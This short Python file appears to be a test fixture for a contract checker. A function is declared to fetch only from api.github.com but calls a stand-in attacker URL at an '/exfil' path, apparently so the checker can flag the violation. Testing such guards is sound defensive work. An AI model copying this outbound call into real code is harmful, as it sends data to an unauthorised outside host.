# ruff: noqa: F821
from tools.web_fetch.trusted import contracts as web
from tools.web_fetch.trusted.effects import fetch_url

import clauz3


@clauz3.guarantee(web.only_fetch_under("https://api.github.com/"))
def main() -> None:
    fetch_url("https://evil.example.com/exfil")
